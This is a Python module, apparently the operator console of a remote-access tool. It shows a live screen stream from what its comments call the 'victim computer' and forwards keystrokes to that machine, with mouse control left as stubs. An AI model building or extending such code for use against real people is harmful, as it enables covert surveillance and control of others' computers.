"""
This file contains all the code for pygame-based functionality
This includes the video stream, keyboard control, and mouse control
"""

import threading
import pygame
# import my stuff
import utils
from consts import *

# define global to keep track of pygame thread and whether it should continue running
pygameThreadHandle = None
pygameThreadRun = False
# globals for tracking if mouse & keyboard control is enabled
mouseControl = False
keyboardControl = False

"""
	Enable/disable video stream from victim computer
	Expects two arguments
		state - True/False for whether video stream should run
		mainSock - main communication socket used for commands
	TODO - combine mouse/keyboard control into video socket or new socket
"""
def toggleVideo(state, mainSock):
	global pygameThreadHandle
	global pygameThreadRun

	if state == True:
		if pygameThreadHandle == None or pygameThreadHandle.is_alive() == False:
			pygameThreadRun = True
			pygameThreadHandle = pygameThread(mainSock)
			pygameThreadHandle.start()
	else:
		pygameThreadRun = False

"""
	Enable/disable control of victim's keyboard
	Expects True/False argument for whether to control keyboard
"""
def toggleKeyboard(state, mainSock):
	global keyboardControl
	keyboardControl = state
	if state: # make sure video stream is on if controlling keyboard
		toggleVideo(state, mainSock)

"""
	Enable/disable control of victim's mouse
	Expects True/False argument for whether to control mouse
"""
def toggleMouse(state, mainSock):
	global mouseControl
	mouseControl = state
	if state: # make sure video stream is on if controlling mouse
		toggleVideo(state, mainSock)

"""
	Create a class to handle all the pygame-based functionality
	This class will run as a separate thread
"""
class pygameThread (threading.Thread):
	def __init__(self, mainSock):
		threading.Thread.__init__(self, daemon=True)
		self.mainSock = mainSock
		self.videoSock = None

	def run(self):
		# get globals
		global mouseControl
		global keyboardControl
		# send signal to start video and create socket
		self.mainSock.sendall(bytes([START_VIDEO]) + b'\0')
		self.videoSock = utils.openConnection(VIDEO_PORT)
		# call pygame handler to display video
		pygameHandler(self.videoSock, self.mainSock)
		# send end signals for mouse, keyboard, and video
		if mouseControl:
			self.mainSock.sendall(bytes([END_MOUSE]) + b'\0')
			mouseControl = False
		if keyboardControl:
			self.mainSock.sendall(bytes([END_KEYS]) + b'\0')
			keyboardControl = False
		self.mainSock.sendall(bytes([END_VIDEO]) + b'\0')
		# close the video socket
		self.videoSock.close()

"""
	Handle all the pygame-based functionality
	TODO - clean up this function
"""
def pygameHandler(videoSock, mainSock):
	# get globals
	global pygameThreadRun
	global mouseControl
	global keyboardControl

	# initialize the pygame module
	pygame.init()
	# load and set the logo
	pygame.display.set_caption("minimal program")

	# create a surface on screen that has the size of 240 x 180
	screen = pygame.display.set_mode((768,432), pygame.RESIZABLE)
	
	# buffer to hold data and way to track file size
	fileSize = 0
	baseWidth = 0
	baseHeight = 0
	data = b''
	buff = b''
	imgBuff = b''
	surf = None
	dirty = False
	frames = 0
	# constants for panning and zooming
	STEP_FACTOR = 20
	ZOOM_FACTOR = 0.1
	# values for offset and zoom
	zoom = 1.0
	offsetX = 0
	offsetY = 0

	# main loop
	while pygameThreadRun:
		# get next frame
		try:
			# get frame information (width, height, size)
			# do this only when we need the next frame's info
			if fileSize == 0:
				data = videoSock.recv(12)
				baseWidth = int.from_bytes(data[0:4], byteorder='big', signed=True)
				baseHeight = int.from_bytes(data[4:8], byteorder='big', signed=True)
				fileSize = int.from_bytes(data[8:12], byteorder='big', signed=True)
				#print(f'File size is {fileSize} with resolution of {baseWidth} x {baseHeight}')
			# get remaining frame data (RGB bytes)
			data = videoSock.recv(fileSize-len(buff))
			#print(f'Recieved {len(data)} bytes')
			if len(data) > 0:
				buff = buff + data
			if len(buff) >= fileSize:
				imgBuff = buff[0:fileSize]
				surf = pygame.image.frombuffer(imgBuff, (baseWidth, baseHeight), "RGBA")
				# do some math so the scaling keeps the same aspect ratio
				windowSize = pygame.display.get_window_size()
				scaledWidth = windowSize[0]
				scaledHeight = scaledWidth * baseHeight / baseWidth # keep image ration - scaled width * image height / image width
				if scaledHeight > windowSize[1]: # too tall for window
					scaledWidth = scaledWidth * windowSize[1] / scaledHeight # reduce width to keep the ration
					scaledHeight = windowSize[1]
				scaledWidth = scaledWidth * zoom
				scaledHeight = scaledHeight * zoom
				surf = pygame.transform.scale(surf, (int(scaledWidth), int(scaledHeight))) # scale the image to fit the window
				buff = buff[fileSize:]
				fileSize = 0
				dirty = True
		except Exception as inst:
			print(type(inst))
			print(inst.args)
			print(inst)
			sleep(10)
		if not data:
			# TODO - connection closed
			print("Connection closed! TODO - Exit program...")
			pygameThreadRun = False
		"""
		if fileSize != 0:
			percent = int(len(buff) * 100 / fileSize)
			print(f'Buffer is {percent}% full')
		else:
			print('Buffer has been filled')
		"""
		if surf != None and dirty:
			# print what frame is being displayed - used for debug
			#print(f"Displaying frame {frames}")
			frames += 1
			# draw the new frame in the center of the window and update the display
			screen.fill((0, 0, 0))
			windowSize = pygame.display.get_window_size()
			centerX = (windowSize[0] - surf.get_width()) // 2
			centerY = (windowSize[1] - surf.get_height()) // 2
			screen.blit(surf, (int(centerX + (offsetX * zoom)), int(centerY + (offsetY * zoom))))
			pygame.display.flip()
			dirty = False
		elif dirty:
			print("surf is NONE!")

		#pygame.display.flip()

		# event handling
		for event in pygame.event.get():
			if event.type == pygame.QUIT: # was the windows closed?
				return
			elif event.type == pygame.KEYDOWN: # key was pressed down
				if event.mod & pygame.KMOD_RCTRL: # right control is pressed down
					dirty = True # assume that the image is mooved or resized
					if event.key == pygame.K_UP: # move up - push image down - increase offsetY
						offsetY = offsetY + (STEP_FACTOR * zoom)
					elif event.key == pygame.K_DOWN:
						offsetY = offsetY - (STEP_FACTOR * zoom)
					elif event.key == pygame.K_LEFT: # move left - push image right - increase offsetX
						offsetX = offsetX + (STEP_FACTOR * zoom)
					elif event.key == pygame.K_RIGHT:
						offsetX = offsetX - (STEP_FACTOR * zoom)
					elif event.key == pygame.K_KP_PLUS or event.key == pygame.K_PLUS: # zoom in
						zoom = zoom + ZOOM_FACTOR # zoom is done linearly - 100%, 110%, 120%, 130%, etc
						surfSize = surf.get_size()
						surf = pygame.transform.scale(surf, (int(surfSize[0] * (1 + ZOOM_FACTOR)), int(surfSize[1] * (1 + ZOOM_FACTOR))))
					elif event.key == pygame.K_KP_MINUS or event.key == pygame.K_MINUS:
						zoom = zoom - ZOOM_FACTOR
						surfSize = surf.get_size()
						surf = pygame.transform.scale(surf, (int(surfSize[0] * (1 - ZOOM_FACTOR)), int(surfSize[1] * (1 - ZOOM_FACTOR))))
					elif event.key == pygame.K_c or event.key == pygame.K_r: # center the image and possibly reset the zoom
						offsetX = 0
						offsetY = 0
						if event.key == pygame.K_r: # reset the zoom
							zoom = 1.0
					else: # image wasn't moved or resized - set dirty bit back to false
						dirty = False
				elif keyboardControl: # right control was not pressed down and we're sending keyboard inputs
					if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
						code = KEY_DICT[event.key]
						mainSock.sendall(bytes([KEY_DOWN, code]) + b'\0')
					else: # TODO - debugging purposes only
						print("Key does not map to Windows virtual-key code!")
			elif event.type == pygame.KEYUP and keyboardControl: # key was released and we're sending keyboard inputs
				if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
					code = KEY_DICT[event.key]
					mainSock.sendall(bytes([KEY_UP, code]) + b'\0')
				else: # TODO - debugging purposes only
					print("Key does not map to Windows virtual-key code!")
			elif event.type == pygame.MOUSEMOTION and mouseControl:
				print("TODO")
			elif event.type == pygame.MOUSEBUTTONDOWN and mouseControl:
				print("TODO")
			elif event.type == pygame.MOUSEBUTTONUP and mouseControl:
				print("TODO")

	# we've broken out of the loop
	pygame.quit()